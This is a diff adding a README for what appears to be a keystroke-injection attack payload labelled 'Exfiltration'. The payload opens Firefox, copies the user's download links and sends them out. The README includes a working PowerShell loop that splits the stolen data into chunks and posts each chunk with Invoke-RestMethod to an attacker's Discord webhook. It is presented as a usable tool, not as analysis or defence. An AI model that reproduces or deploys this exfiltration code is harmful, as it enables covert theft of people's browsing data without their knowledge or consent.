@@ -1,0 +1,48 @@
+# Exports all the links of the downloads
+
+This script can be used to export all the links of the latest downloads made through Firefox.
+
+**Category**: Exfiltration
+
+
+## Description
+
+This script can be used to export all the links of the latest downloads made through Firefox.
+
+This script open the Firefox app, then go to downloads page and copy all, then open a PowerShell and put all the download link in a var named $DOWNLOADS, then use a Discord Webhook to exfiltrate it.
+
+
+## Dependencies
+
+* Firefox must be installed
+* Internet connection
+
+
+## Settings
+
+- You must define your Discord webhook if you want to use this method for the exfiltration
+
+    `DEFINE DISCORD_WEBHOOK example`
+
+- This delay depends on the number of links
+
+    `DELAY 10000`
+
+- This algorithm is used to avoid the size limit imposed by Invoke-RestMethod on the payload length
+
+    ```
+    $len = $DOWNLOADS.Length
+        $MAX_LEN = 1900
+
+        $ITERATIONS = [math]::Ceiling($len / $MAX_LEN)
+
+        for ($i = 0; $i -lt $ITERATIONS; $i++) {
+            $init = $i * $MAX_LEN
+            $end = [math]::Min(($i + 1) * $MAX_LEN, $len)
+            
+            $sub = $DOWNLOADS.Substring($init, $end - $init)
+            $Payload = @{content = $sub} | ConvertTo-Json
+
+            Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $Payload -ContentType 'application/json'
+        }
+    ```
